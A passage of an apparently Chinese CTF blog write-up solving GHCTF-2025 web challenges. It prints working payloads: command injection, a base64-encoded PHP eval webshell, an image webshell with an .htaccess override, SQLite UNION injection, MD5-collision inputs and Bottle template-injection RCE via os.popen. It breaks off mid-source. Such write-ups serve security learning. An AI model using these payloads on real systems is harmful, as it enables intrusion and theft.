class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>)); <span class="comment">// 创建了一个InputValidator实例</span></span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>); <span class="comment">// 调用了validate方法，跟进InputValidator类的validate方法. 7</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>); <span class="comment">// 调用CommandExecutor实例的execute方法，跟进CommandExecutor实例的execute方法. 8</span></span><br><span class="line">            <span class="comment"># 返回到原先代码</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;debug&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Debug mode enabled&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;generate&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Random string: &quot;</span> . <span class="title class_">StringUtils</span>::<span class="title function_ invoke__">generateRandomString</span>(<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unknown action&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>(); <span class="comment">// 创建了ConfigLoader实例，跟进 ConfigLoader 类的__construct方法. 1</span></span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>)); <span class="comment">// 创建了Logger实例，还调用了config实例的get方法，先跟进ConfigLoder类的get方法 2;接着进入Logger的__construct方法 3</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$actionHandler</span> = <span class="keyword">new</span> <span class="title class_">ActionHandler</span>(<span class="variable">$config</span>, <span class="variable">$logger</span>); <span class="comment">// 创建ActionHandler实例，跟进ActionHandler类的__construct方法。4</span></span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;input&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$actionHandler</span>-&gt;<span class="title function_ invoke__">handle</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>], <span class="variable">$input</span>); <span class="comment">// 调用actionHandler实例的handle方法；跟进 ActionHandler类的handle方法。 6 完成代码审计</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line">    <span class="variable">$userManager</span> = <span class="keyword">new</span> <span class="title class_">UserManager</span>(<span class="variable">$logger</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">addUser</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">authenticate</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$logger</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;No action provided, running default logic&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过下面方式进行命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28878/?action=run&amp;input=命令</span><br></pre></td></tr></table></figure><p>通过ls -al查看，发现&#x2F;flag权限很高，我们无法通过cat &#x2F;f*得到flag，需要suid提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find%09/%09-perm%09-u=s%09-type%09f%092&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250707174550118.png" class="" title="image-20250707174550118"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo%09&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg&quot;%09|base64%09-d%09&gt;%09/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>base64加密的原因：如果不加密，无法将$_POST写入文件。</p><p>用蚁剑连接。</p><p>wc命令的–files0-from参数可以读取以空字符终止的文件名，然后统计文件的内容；如果没有这个文件，发生报错，就可以泄露出文件内容。</p><img src="/CTFwp/GHCTF-2025/image-20250707175141502.png" class="" title="image-20250707175141502"><h2 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h2><p>文件上传漏洞，当我们修改后缀，以及content-Type后，显示还是非法文件，其肯定检测了文件内容，我们先上传一个图片马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary2AjUVhA32p43CAAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&#123;&#123;unquote(&quot;\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\x09pHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\&lt;?=$_GET[0]\x28$_POST[1]\x29;?&gt;X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3\x7d\xaa&#x27;\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\x0aF\xc1\x28\x18\x05\xa3`\x14\x8c\x82Q0\x0a\x86\x0d\x00\x00\x81\xb2\x1b\x02\x07x\x0d\x0c\x00\x00\x00\x00IEND\xaeB`\x82&quot;)&#125;&#125;</span><br><span class="line">------WebKitFormBoundary2AjUVhA32p43CAAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundary2AjUVhA32p43CAAA--</span><br></pre></td></tr></table></figure><p>接着就是想办法解析它，<code>Server: Apache/2.4.54 (Debian)</code>，我们可以上传.htaccess文件，解析文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarySReOXPWFdKLAcDOr</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">------WebKitFormBoundarySReOXPWFdKLAcDOr</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundarySReOXPWFdKLAcDOr--</span><br></pre></td></tr></table></figure><p>如果给前面加GIF89a，则images页面解析错误，状态码是500.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarySReOXPWFdKLAcDOr</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">------WebKitFormBoundarySReOXPWFdKLAcDOr</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundarySReOXPWFdKLAcDOr--</span><br></pre></td></tr></table></figure><p>可以设置高度和宽度来绕过检测；接下来就是命令执行：</p><img src="/CTFwp/GHCTF-2025/image-20250708170318059.png" class="" title="image-20250708170318059"><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p>过滤了 单引号和双引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 order by 5 --+  有5列</span><br><span class="line"></span><br><span class="line">1 union select 1,2,3,4,(select group_concat(sql) from sqlite_master) --+</span><br><span class="line"></span><br><span class="line">-- 出现这个 CREATE TABLE &quot;flag&quot; ( &quot;flag&quot; TEXT ), CREATE TABLE &quot;users&quot; ( &quot;id&quot; INTEGER, &quot;username&quot; TEXT, &quot;email&quot; TEXT, &quot;phone&quot; TEXT, &quot;address&quot; TEXT )</span><br><span class="line"></span><br><span class="line">-- 读取数据</span><br><span class="line">1 union select 1,2,3,4,(select group_concat(flag) from flag) --+</span><br></pre></td></tr></table></figure><h2 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>强比较，判断类型；md5强碰撞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%E6F%F3%A3j%BC%FF%80%BFj%D4%DCn%D2E%99%DC%D3%BCv%C6%B4%AA%97%24%F6%3F%E5%15%18%1D%D8%D8%CD%B0%C4%D2%288%D8o%2C%CD%11%A8%05%3FU%8F%B9%D3%ABV%D3L%3B%F0%A2%DD%92ky%5B%10%82%A2%FD%C3%B3V%16%3A%8Fs%9EsL%0Ca%DC%128%14%25V%08%C1%2C%22%DD%E6vJ%ED%DD%CC%1DP%FE%9EJ%BF%BEg%5E%A5%C1Y%88%88r%1E%B0l%D6sv%C9%A3%DE%BAW%EC%FE%05%96%2CW</span><br><span class="line"></span><br><span class="line">%E6F%F3%A3j%BC%FF%80%BFj%D4%DCn%D2E%99%DC%D3%BC%F6%C6%B4%AA%97%24%F6%3F%E5%15%18%1D%D8%D8%CD%B0%C4%D2%288%D8o%2C%CD%11%A8%85%3FU%8F%B9%D3%ABV%D3L%3B%F0%A2%DD%12ky%5B%10%82%A2%FD%C3%B3V%16%3A%8Fs%9EsL%0Ca%DC%128%14%A5V%08%C1%2C%22%DD%E6vJ%ED%DD%CC%1DP%FE%9EJ%BF%BEg%5E%A5%C1Y%88%08r%1E%B0l%D6sv%C9%A3%DE%BAW%EC%7E%05%96%2CW</span><br></pre></td></tr></table></figure><p>方法1：泄露根目录下的docker-entrypoint.sh文件</p><p>docker-entrypoint.sh一般是用于初始化容器环境的，里面可能会泄露敏感信息。(你就乞求出题人没有删除这个文件。)</p><img src="/CTFwp/GHCTF-2025/image-20250710161759735.png" class="" title="image-20250710161759735"><p>flag在<code>f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag</code></p><img src="/CTFwp/GHCTF-2025/image-20250710161842173.png" class="" title="image-20250710161842173"><p>方法2：将任意文件读升级到RCE(CVE-2024-2961)。<a href="https://github.com/kezibei/php-filter-iconv">脚本</a></p><p>泄露maps文件：</p><img src="/CTFwp/GHCTF-2025/image-20250710162120211.png" class="" title="image-20250710162120211"><p>将maps文件保存到此项目的maps文件下：</p><img src="/CTFwp/GHCTF-2025/image-20250710162214272.png" class="" title="image-20250710162214272"><p>寻找libc文件：</p><img src="/CTFwp/GHCTF-2025/image-20250710162314336.png" class="" title="image-20250710162314336"><p>读取文件并通过linux命令将返回结果写入文件：</p><img src="/CTFwp/GHCTF-2025/image-20250710163155214.png" class="" title="image-20250710163155214"><p>删除里面的响应头，进行base64解码：</p><img src="/CTFwp/GHCTF-2025/image-20250710163404878.png" class="" title="image-20250710163404878"><img src="/CTFwp/GHCTF-2025/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-10%20163947.png" class="" title="屏幕截图 2025-07-10 163947"><p>绿色的地方修改，紫色的不修改。运行此文件，将payload放在file里面，进行发包，最后再进行命令执行。</p><p>通过burpsuite进行抓包，发包，yakit会出现代理错误。</p><img src="/CTFwp/GHCTF-2025/image-20250710164654146.png" class="" title="image-20250710164654146"><h2 id="Message-in-a-Bottle"><a href="#Message-in-a-Bottle" class="headerlink" title="Message in a Bottle"></a>Message in a Bottle</h2><p>这题我没有开远程，太费金币了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message.replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="comment"># 过滤了&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Clean&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clean</span>():</span><br><span class="line">    <span class="keyword">global</span> messages</span><br><span class="line">    messages = []</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/&quot;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要看submit路由即可。</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    message = waf(request.forms.get(<span class="string">&#x27;message&#x27;</span>)) <span class="comment"># waf 跟进</span></span><br><span class="line">    messages.append(message) <span class="comment"># 添加留言条的</span></span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages)) <span class="comment"># 进行了渲染</span></span><br></pre></td></tr></table></figure><p>{} 被过滤，我们还可以使用 % 或 &lt;%%&gt;。</p><p>% 和 &lt;%%&gt; 没有回显。</p><p>Bottle的模板渲染最终调用了exec函数，可以直接写代码。</p><img src="/CTFwp/GHCTF-2025/image-20250723161857593.png" class="" title="image-20250723161857593"><p>如果我们写入的内容与字符串拼接后再渲染时，建议先换行再写入我们的代码，就像上面插入的图片。</p><p>发送上面的图片会报错。</p><img src="/CTFwp/GHCTF-2025/image-20250723162202591.png" class="" title="image-20250723162202591"><p>我们只需要用多行注释将我们写的代码包裹起来。</p><img src="/CTFwp/GHCTF-2025/image-20250723162326440.png" class="" title="image-20250723162326440"><p>可以执行。</p><p>bottle的abort操作空间很大：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abort(401,&#x27;forbidden&#x27;)</span><br><span class="line">abort触发错误，停止代码执行，并回显forbidden,如果我们将命令执行后的结果放在这里，他就会回显结果。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    data=__import__(&#x27;os&#x27;).popen(__import__(&#x27;bottle&#x27;).request.query.a).read()</span></span><br><span class="line"><span class="string">    __import__(&#x27;bottle&#x27;).abort(404,data)</span></span><br><span class="line"><span class="string">%&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250723163355857.png" class="" title="image-20250723163355857"><p>远程的话，直接可以拿flag。</p><h2 id="Message-in-a-Bottle-plus"><a href="#Message-in-a-Bottle-plus" class="headerlink" title="Message in a Bottle plus"></a>Message in a Bottle plus</h2><p>此题没有给附件。</p><p>我们可以根据上一题的附件去做这道题目，这道题肯定是在上一题的基础上增加了一些过滤。</p><p>一定要自信一些。</p><p>如果不加注释的话，会报错，报错的内容与上一题一样。&lt;&gt;被过滤了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">% data=__import__(&#x27;os&#x27;).popen(__import__(&#x27;bottle&#x27;).request.query.a).read()</span></span><br><span class="line"><span class="string">% __import__(&#x27;bottle&#x27;).abort(404,data)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250723164815101.png" class="" title="image-20250723164815101"><p>下面是源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, template, run</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储留言的列表</span></span><br><span class="line">messages = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">message</span>):</span><br><span class="line">    message_items = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;message-card&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-content&quot;&gt;<span class="subst">&#123;msg&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;small class=&quot;message-time&quot;&gt;#<span class="subst">&#123;idx + <span class="number">1</span>&#125;</span> - 刚刚&lt;/small&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> <span class="keyword">for</span> idx, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(message)])</span><br><span class="line"></span><br><span class="line">    board = <span 